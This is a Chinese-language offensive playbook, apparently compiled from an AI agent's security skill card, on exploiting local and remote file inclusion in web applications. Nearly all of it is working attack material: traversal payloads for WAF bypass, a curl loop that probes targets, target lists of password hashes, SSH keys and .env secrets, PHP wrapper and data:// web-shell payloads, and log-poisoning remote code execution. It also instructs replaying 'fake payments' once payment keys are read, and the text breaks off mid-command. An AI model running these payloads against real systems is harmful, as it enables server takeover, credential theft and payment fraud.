---
title: "测绘引擎LFI作业手法.md"
generated: 2026-10-21
kind: consolidated-playbook
note: 由现役技能卡自动汇总；保留原卡语义，未改写攻防步骤
---

# 测绘引擎LFI作业手法.md

> 本页由引用该路径的现役技能卡汇总生成。原始内容与完整步骤见下方来源卡；不要把它当成独立的新打法。

## 来源卡

- `/root/.hermes/skills/security/lfi-rfi-exploit/SKILL.md`

## 汇总内容

### lfi-rfi-exploit

来源：`/root/.hermes/skills/security/lfi-rfi-exploit/SKILL.md`

# Skill: LFI/RFI 路径穿越极致版

## 作业入口（先跑）

```bash
python3 tools/ops/tpl_inject_probe.py lfi --url 'https://授权/?file=FUZZ' --param file --case <案>
```

产物：`测绘/tpl_inject/lfi.json`。读到 `.env` / 支付钥立刻回灌假支付，不要只报 passwd。  
Vite `@fs` 走 `vite-fs-read`；Nginx alias 走 `nginx-misconfig`。

## 真源

- 手法：`docs/playbooks/测绘引擎LFI作业手法.md`
- 工具：`python3 tools/ops/tpl_inject_probe.py lfi --help`

---

## 1. 绕过矩阵（WAF / 过滤器对抗）

### 1.1 编码变体全表

| 变体 | Payload | 绕过场景 |
|------|---------|---------|
| 标准 | `../../etc/passwd` | 无过滤 |
| URL 编码 | `..%2f..%2fetc%2fpasswd` | 过滤明文 `../` |
| 双重 URL 编码 | `..%252f..%252fetc%252fpasswd` | 过滤一次 urldecode |
| UTF-8 多字节 | `..%c0%af..%c0%afetc%c0%afpasswd` | 字节级 ASCII 过滤 |
| Unicode 宽字符 | `..%u2215..%u2215etc` | ASCII 过滤 |
| 双写绕过 | `....//....//etc//passwd` | 删除单个 `../` |
| 混合斜线 | `..\/..\/etc\/passwd` | 只过滤正斜线 |
| 超深穿越 | `../../../../../../../../../../../etc/passwd` | 路径深度检查 |
| 空字节截断 | `../../etc/passwd%00.jpg` | 后缀绑定（PHP < 5.3.4）|
| 点点斜线变体 | `..\../etc/passwd` | 正则 `\.\.\/` |
| 多斜线 | `....////etc/passwd` | 折叠处理 |
| 路径+Base64 | `php://filter/convert.base64-encode/resource=../../etc/passwd` | - |
| 反斜线混用 | `..%5c..%5cetc%5cpasswd` | Windows %5c=\ |
| 绝对路径直给 | `/etc/passwd` | **先试这个，省去猜层数** |
| ⭐ Emoji 斜线替换 | `⬅️/⬅️/⬅️/etc/passwd` | Unicode emoji 绕过 ASCII `../` 过滤 |
| ⭐ 空字节+扩展名 | `../../../etc/./passwd%00.png` | 后缀白名单 + NULL 截断（PHP<5.3.4）|
| ⭐ 剥离后双写 | `..././..././..././e../tc..//pas../swd` | WAF 递归删 `../` 但只删一轮 |
| ⭐ 多阶段嵌套编码 | `..%2%35%32F..%2%35%32F..%2%35%32Fetc%2%35%32Fpasswd` | 三层嵌套：WAF 解一层看不出 `../`，后端解两层还原 |
| ⭐ 4096截断填充 | `../../../etc/./passwd/././././././` (填到4096字节) | PHP `open_basedir` / 后缀拼接被截断丢弃 |

**实战规律**：后端先 urldecode 再检查，WAF 看原始字节 → 先单编码，不过再双编码。Emoji 路径在 Node.js/Python 后端命中率高（Unicode normalization 把 emoji 映射回 ASCII 斜线）。

### 1.2 快速绕过扫描

```bash
for payload in \
  '../../etc/passwd' \
  '....//....//etc/passwd' \
  '..%2f..%2fetc%2fpasswd' \
  '..%252f..%252fetc%252fpasswd' \
  '%2e%2e%2f%2e%2e%2fetc%2fpasswd' \
  '/etc/passwd'; do
  result=$(curl -sk "https://目标/?file=${payload}")
  echo "$result" | grep -q "root:" && echo "✅ HIT: $payload" && break
done
```

---

## 2. 基础读取目标

```bash
# Linux 高价值文件
/etc/passwd           # 枚举用户
/etc/shadow           # 密码哈希（需 root）
/etc/hosts            # 内网 IP 发现
/proc/self/environ    # 环境变量（含密钥/UA注入点）
/proc/net/tcp         # 内网端口（十六进制，见 §6.4）
/proc/self/cmdline    # 进程命令行
/proc/1/cgroup        # 判断是否在容器内
/home/www/.ssh/id_rsa # SSH 私钥
/root/.ssh/id_rsa
/var/www/html/.env
/var/www/.env
../../.env
../../../../config.php
../../../../database.php

# Windows 高价值文件
../../windows/win.ini          # 确认穿越存在
../../windows/system32/drivers/etc/hosts
../../windows/system32/config/SAM
../../inetpub/wwwroot/web.config
../../appsettings.json
```

---

## 3. PHP 伪协议全家桶

### 3.1 php://filter（读源码）

```bash
# Base64 读取
?file=php://filter/convert.base64-encode/resource=index.php
# 解码
echo "PD9waH..." | base64 -d

# 链式过滤器
?file=php://filter/convert.base64-encode|convert.base64-encode/resource=index.php

# ROT13
?file=php://filter/read=string.rot13/resource=index.php

# iconv 链（php_filter_chain_generator RCE oracle，见 §7.3）
```

### 3.2 php://input（代码执行）

```bash
curl -X POST "http://target/?file=php://input" \
  -d '<?php system($_GET["cmd"]); ?>' && \
curl "http://target/?file=php://input&cmd=id"
# 条件：allow_url_include=On
```

### 3.3 data:// 协议

```bash
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
# 明文
?file=data://text/plain,<?php system('id'); ?>
```

### 3.4 phar:// + zip:// (配合上传 RCE)

```bash
# 上传 evil.jpg（内含 PHP payload 的 phar/zip）→ 包含
?file=phar:///var/www/html/uploads/evil.jpg/evil.php
?file=zip:///var/www/html/uploads/evil.zip%23shell.php
# 见 §7.2 Zip Slip
```

---

## 4. 日志投毒 RCE（Log Poisoning）

### 4.1 定位日志（先读后投）

```bash
# 常见路径
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/httpd/access.log
/var/log/apache2/error.log
/var/log/auth.log        # SSH 投毒
/var/mail/www-data       # SMTP 投毒

# 找不到路径 → 枚举 /proc/self/fd（§4.3）
```

### 4.2 UA 投毒

```bash
# 1. 注入 PHP 到 User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 2. 包含日志执行
curl "http://target.com/?file=../../../../var/log/nginx/access.log&cmd=id"
```

### 4.3 /proc/self/fd 枚举日志

```bash
# fd/0=stdin fd/1=stdout fd/2=stderr fd/5+ 可能是日志
for i in $(seq 0 20); do
  result=$(curl -s "http://target/?file=../../../../proc/self/fd/$i" 2>/dev/null)
  echo "$result" | grep -q "HTTP\|GET\|POST" && echo "✅ fd/$i 是访问日志" && break
done
# 确认 fd 后投毒
curl -A "<?php system

…（截断，全文见来源卡）
